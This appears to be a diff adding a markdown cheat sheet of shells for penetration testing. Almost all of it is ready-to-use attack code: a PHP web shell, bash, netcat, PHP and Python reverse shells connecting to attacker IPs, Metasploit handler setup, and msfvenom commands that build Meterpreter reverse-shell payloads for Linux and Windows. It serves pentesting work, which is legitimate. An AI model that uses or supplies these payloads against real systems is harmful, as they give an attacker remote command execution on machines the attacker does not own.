@@ -1,0 +1,53 @@
+# Shells for pentesting
+Remember that for getting a connection using the shells you need to set up a listener:
+*NetCat:
+`nc -nlvp 4444`
+
+Metasploit:
+msfconsole
+use multi/handler*
+
+
+PHP Webshell:
+`<?php system($_GET["cmd"]); ?>`
+
+Bash:
+`bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
+`bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'`
+
+NetCat:
+`nc 10.10.10.10 4444 -e /bin/bash`
+
+Php:
+`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.104/4444 0>&1'");?>`
+
+Python3:
+# Copy and paste to a file, the change the IP and PORT
+`import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.10.0",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+subprocess.call(["/bin/sh","-i"])`
+
+Metasploit
+# Example: 
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.10
+set LPORT 4444
+run
+# Then you need to execute the shell
+
+Reverse shells for LINUX with msfvenom:
+*Elf* msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf
+*War* msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war
+
+Reverse shells for WINDOWS with msfvenos:
+*Asp*  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp > shell.asp
+*Aspx* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > shell.aspx
+*Exe*  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
